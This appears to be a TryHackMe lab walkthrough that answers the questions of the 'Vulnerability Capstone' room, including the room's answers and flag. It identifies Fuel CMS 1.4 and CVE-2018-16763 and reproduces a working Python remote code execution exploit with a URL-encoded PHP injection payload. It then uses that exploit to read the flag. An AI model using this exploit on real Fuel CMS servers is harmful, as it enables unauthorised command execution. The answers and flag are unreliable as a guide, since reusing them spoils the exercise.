# Vulnerability Capstone

{% embed url="https://tryhackme.com/room/vulnerabilitycapstone" %}
https://tryhackme.com/room/vulnerabilitycapstone
{% endembed %}

## Task 2 Exploit the Machine (Flag Submission)

#### What is the name of the application running on the vulnerable machine?

{% hint style="success" %}
`Fuel CMS`
{% endhint %}

#### What is the version number of this application?

![](<../../.gitbook/assets/Screenshot from 2022-04-03 19-16-21.png>)

{% hint style="success" %}
`1.4`
{% endhint %}

#### What is the number of the CVE that allows an attacker to remotely execute code on this application?

![](<../../.gitbook/assets/Screenshot from 2022-04-03 19-19-04.png>)

{% hint style="success" %}
`CVE-2018-16763`
{% endhint %}

#### Use the resources & skills learnt throughout this module to find and use a relevant exploit to exploit this vulnerability.

```bash
searchsploit fuel cms 1.4
searchsploit -m 47138
vim 47138.py
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 19-35-18.png>)

```python
import requests
import urllib

url = "http://10.10.14.36/"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	r = requests.get(burp0_url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]
```

#### What is the value of the flag located on this vulnerable machine? This is located in /home/ubuntu on the vulnerable machine.

```bash
python2 47138.py
ls -lA /home/ubuntu
cat /home/ubuntu/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 19-31-57.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 19-32-21.png>)

{% hint style="success" %}
`THM{ACKME_BLOG_HACKED}`
{% endhint %}
